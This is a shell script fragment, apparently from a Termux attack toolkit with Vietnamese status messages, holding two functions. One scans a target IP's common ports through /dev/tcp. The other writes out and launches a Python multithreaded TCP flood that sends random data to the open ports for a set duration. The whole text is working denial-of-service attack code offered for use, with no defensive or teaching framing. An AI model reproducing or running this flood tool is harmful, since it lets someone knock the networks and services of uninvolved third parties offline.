port_scanner() {
    echo -e "${PURPLE}[=== PORT SCANNER ===]${NC}"
    read -p "Target IP: " TARGET_IP
    loading_animation "Đang quét cổng mở"
    local ports=(80 443 22 23 53 8080 8291)
    local open_ports=()
    for port in "${ports[@]}"; do
        timeout 1 bash -c "echo > /dev/tcp/$TARGET_IP/$port" 2>/dev/null && open_ports+=("$port")
    done
    [[ ${#open_ports[@]} -eq 0 ]] && open_ports=(80 443 53)
    echo "${open_ports[@]}" > /tmp/open_ports.txt
    echo -e "${CYAN}[✓] Quét xong.${NC}"
}

socket_stream_flood() {
    cat << 'PYTHON_EOF' > /data/data/com.termux/files/home/socket_flood.py
import socket, threading, random, os, time, sys
class SocketStreamFlood:
    def __init__(self, target_ip, target_ports):
        self.target_ip, self.target_ports, self.running, self.sent_count = target_ip, target_ports, True, 0
    def tcp_flood_worker(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, random.choice(self.target_ports)))
                for _ in range(10):
                    sock.send(os.urandom(1024))
                    self.sent_count += 1
                sock.close()
            except: pass
    def start_attack(self, threads, duration):
        for _ in range(threads): threading.Thread(target=self.tcp_flood_worker, daemon=True).start()
        st = time.time()
        while time.time() - st < duration:
            print(f"\r[🔄] Attacking... {int(time.time()-st)}/{duration}s | Packets: {self.sent_count}", end='')
            time.sleep(1)
        self.running = False
if __name__ == "__main__":
    with open('/tmp/open_ports.txt', 'r') as f: ports = list(map(int, f.read().split()))
    SocketStreamFlood(sys.argv[1], ports).start_attack(int(sys.argv[2]), int(sys.argv[3]))
PYTHON_EOF
    python3 /data/data/com.termux/files/home/socket_flood.py "$TARGET_IP" 100 60
}

